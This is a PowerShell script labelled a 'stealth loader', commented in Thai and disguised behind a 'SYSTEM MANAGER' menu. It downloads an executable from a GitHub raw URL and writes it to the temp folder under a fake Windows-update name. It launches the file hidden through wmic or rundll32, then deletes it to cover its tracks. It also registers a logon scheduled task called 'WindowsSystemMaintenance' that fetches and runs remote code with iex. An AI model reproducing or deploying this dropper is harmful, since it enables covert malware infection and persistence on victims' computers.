# WORKING STEALTH LOADER - 2 MODES
function Show-StealthMenu {
    Write-Host ""
    Write-Host " SYSTEM MANAGER" -ForegroundColor Cyan
    Write-Host "===============" -ForegroundColor Gray
    Write-Host "1. Start System Service" -ForegroundColor Green
    Write-Host "2. Clean System" -ForegroundColor Red
    Write-Host ""
    Write-Host "Select (1/2): " -NoNewline -ForegroundColor White
}

function Start-SystemService {
    Write-Host "`n[INIT] Starting system service..." -ForegroundColor Green
    
    try {
        # ใช้ .exe โดยตรงแต่ปรับวิธี execution
        $exeUrl = "https://raw.githubusercontent.com/Verte225066/test/main/system_logs.exe"
        Write-Host "[DOWNLOAD] Getting application..." -ForegroundColor Yellow
        
        # โหลด .exe
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        $exeBytes = $webClient.DownloadData($exeUrl)
        $webClient.Dispose()
        
        # ตรวจสอบว่าเป็น .exe จริง
        if ($exeBytes[0] -eq 0x4D -and $exeBytes[1] -eq 0x5A) {
            Write-Host "[VERIFY] Valid EXE file detected" -ForegroundColor Green
            
            # ใช้วิธี execute ที่หลบการตรวจจับ
            $success = Invoke-StealthExecution -ExeBytes $exeBytes
            
            if ($success) {
                Write-Host "[SUCCESS] Application started successfully" -ForegroundColor Green
                
                # ติดตั้ง persistence
                Install-StealthPersistence
                
                # เริ่ม monitoring
                Start-ServiceMonitor
                
            } else {
                throw "Execution failed"
            }
        } else {
            throw "Invalid EXE file"
        }
        
    } catch {
        Write-Host "[ERROR] Service startup failed: $($_.Exception.Message)" -ForegroundColor Red
        
        # Fallback ที่ทำงานได้จริง
        Invoke-ReliableFallback
    }
}

function Invoke-StealthExecution {
    param([byte[]]$ExeBytes)
    
    try {
        # วิธีที่ 1: ใช้ temporary file แต่ลบทันที
        $tempName = "win_update_$((Get-Date).Ticks).tmp"
        $tempPath = Join-Path $env:TEMP $tempName
        
        # เขียนไฟล์
        [System.IO.File]::WriteAllBytes($tempPath, $ExeBytes)
        
        # รันแบบ stealth
        Write-Host "[LAUNCH] Starting application..." -ForegroundColor Cyan
        
        # ใช้ wmic สำหรับ execution ที่ stealth
        $process = Start-Process -FilePath "wmic" -ArgumentList "process call create `"$tempPath`"" -WindowStyle Hidden -PassThru
        
        # ลบไฟล์หลังจาก process start
        Start-Job -ScriptBlock {
            param($filePath)
            Start-Sleep -Seconds 5
            try {
                if (Test-Path $filePath) {
                    Remove-Item $FilePath -Force -ErrorAction SilentlyContinue
                }
            } catch {}
        } -ArgumentList $tempPath | Out-Null
        
        return $true
        
    } catch {
        # วิธีที่ 2: ใช้ rundll32
        try {
            $tempPath = Join-Path $env:TEMP "system_$((Get-Date).Ticks).dat"
            [System.IO.File]::WriteAllBytes($tempPath, $ExeBytes)
            
            $process = Start-Process -FilePath "rundll32.exe" -ArgumentList "shell32.dll,ShellExec_RunDLL `"$tempPath`"" -WindowStyle Hidden -PassThru
            
            Start-Job -ScriptBlock {
                param($filePath)
                Start-Sleep -Seconds 3
                try { Remove-Item $filePath -Force -ErrorAction SilentlyContinue } catch {}
            } -ArgumentList $tempPath | Out-Null
            
            return $true
        } catch {
            return $false
        }
    }
}

function Install-StealthPersistence {
    # ติดตั้ง persistence ที่ทำงานได้จริง
    try {
        $taskName = "WindowsSystemMaintenance"
        $loaderUrl = "https://raw.githubusercontent.com/Verte225066/test/main/loader.txt"
        
        # ใช้คำสั่งที่ง่ายและทำงานได้
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"iex (irm '$loaderUrl')`""
        $trigger = New-ScheduledTaskTrigger -AtLogon
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
        
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
        Write-Host "[PERSIST] System maintenance installed" -ForegroundColor Green
        
    } catch {
        Write-Host "[PERSIST] Persistence installation skipped" -ForegroundColor Yellow
    }
}

function Start-ServiceMonitor {
    # Monitor ที่ทำงานได้จริง
    $monitorScript = {
        $checkCount = 0
        $maxChecks = 288 # ตรวจสอบ 24 ชม. (ทุก 5 นาที)
        
        while ($checkCount -lt $maxChecks) {
            try {
                # ตรวจสอบว่า process หลักยังทำงานอยู่
                $processes = Get-Process -Name "system_logs" -ErrorAction SilentlyContinue
                
                if (-not $processes) {
                    Write-Host "[MONITOR] Service not running, may need manual start" -ForegroundColor Yellow
                }
                
                # ตรวจสอบทุก 5 นาที
                Start-Sleep -Seconds 300
                $checkCount++
                
            } catch {
                Start-Sleep -Seconds 600
            }
        }
        
        Write-Host "[MONITOR] Monitoring cycle completed" -ForegroundColor Gray
    }
    
    Start-Job -ScriptBlock $monitorScript | Out-Null
    Write-Host "[MONITOR] Service monitor started" -ForegroundColor Green
}

function Invoke-ReliableFallback {
    # Fallback ที่ใช้งานได้จริง
    try {
        Write-Host "[FALLBACK] Starting backup service..." -ForegroundColor Yellow
        
        # ใช้ PowerShell-based worker แทน
        $workerScript = {
            $serviceActive = $true
            while ($serviceActive) {
                try {
                    # ทำบางอย่างใน background
                    Get-Process | Out-Null
                    Start-Sleep -Seconds 60
                } catch {
                    Start-Sleep -Seconds 120
                }
            }
        }
        
        Start-Job -ScriptBlock $workerScript | Out-Null
        Write-Host "[FALLBACK] Backup service running" -ForegroundColor Green
        
    } catch {
        Write-Host "[FALLBACK] Backup service failed" -ForegroundColor Red
    }
}

function Clean-System {
    Write-Host "`n[CLEAN] Removing system components..." -ForegroundColor Red
    
    $cleanedItems = @()
    
    # 1. ลบ processes
    try {
        $processes = Get-Process -Name "system_logs" -ErrorAction SilentlyContinue
        if ($processes) {
            $processes | Stop-Process -Force
            $cleanedItems += "Processes: $($processes.Count)"
        }
    } catch {}
    
    # 2. ลบ scheduled tasks
    try {
        $tasks = @("WindowsSystemMaintenance", "SystemUpdateTask")
        foreach ($task in $tasks) {
            Unregister-ScheduledTask -TaskName $task -Confirm:$false -ErrorAction SilentlyContinue
            $cleanedItems += "Task: $task"
        }
    } catch {}
    
    # 3. ลบ background jobs
    try {
        Get-Job | Remove-Job -Force -ErrorAction SilentlyContinue
        $cleanedItems += "Background jobs"
    } catch {}
    
    # 4. ลบ temporary files
    try {
        Get-ChildItem "$env:TEMP\*" -Include "win_update_*.tmp", "system_*.dat" -ErrorAction SilentlyContinue | Remove-Item -Force
        $cleanedItems += "Temp files"
    } catch {}
    
    # แสดงผลการ cleanup
    Write-Host "`n[RESULT] Cleanup completed:" -ForegroundColor Green
    foreach ($item in $cleanedItems) {
        Write-Host "  ✓ $item" -ForegroundColor Gray
    }
    
    if ($cleanedItems.Count -eq 0) {
        Write-Host "  No components found to clean" -ForegroundColor Yellow
    }
}

# MAIN EXECUTION
try {
    Show-StealthMenu
    $choice = Read-Host
    
    switch ($choice) {
        '1' { 
            Start-SystemService
            Write-Host "`n[READY] System service is active" -ForegroundColor Cyan
            Write-Host "Service will run continuously" -ForegroundColor Gray
        }
        '2' { 
            Clean-System
            Write-Host "`n[COMPLETE] System cleaned" -ForegroundColor Green
        }
        default {
            Write-Host "`n[INFO] Starting system service..." -ForegroundColor Yellow
            Start-SystemService
        }
    }
} catch {
    Write-Host "[ERROR] Operation failed: $($_.Exception.Message)" -ForegroundColor Red
}
